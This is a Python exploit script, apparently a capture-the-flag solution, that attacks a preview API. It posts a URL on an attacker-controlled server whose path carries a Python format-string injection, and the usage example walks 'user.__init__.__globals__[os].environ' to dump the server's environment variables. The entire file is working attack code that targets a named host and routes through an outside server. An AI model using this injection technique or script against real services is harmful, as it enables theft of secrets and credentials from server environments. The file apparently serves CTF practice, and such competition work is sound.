#!/usr/bin/env python3
import requests
import sys
import urllib.parse

# Configuration
TARGET_URL = "http://chals2.eof.ais3.org:20957/api/preview"
MY_SERVER = "http://140.112.247.246:5000"

def main():
    if len(sys.argv) < 2:
        print("Usage: ./ssti.py <attribute_path>")
        print("Example: ./ssti.py user.__init__.__globals__[os].environ")
        sys.exit(1)

    # 1. Get the input (e.g., user.__init__.__globals__)
    attr_path = sys.argv[1]


    payload = "{" + attr_path + "}"

    # 3. URL-encode the payload for the 'url' parameter
    # This ensures characters like {} [] are passed correctly to curl
    encoded_payload = urllib.parse.quote(payload)
    trigger_url = f"{MY_SERVER}/{encoded_payload}"

    # 4. Construct JSON data
    data = {
        "url": trigger_url,
        "username": "x"
    }

    print(f"[*] Triggering: {trigger_url}")

    try:
        response = requests.post(TARGET_URL, json=data, timeout=10)
        print("\n[+] Response from Server:")
        print("==========================")
        print(response.text)
        print("==========================")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()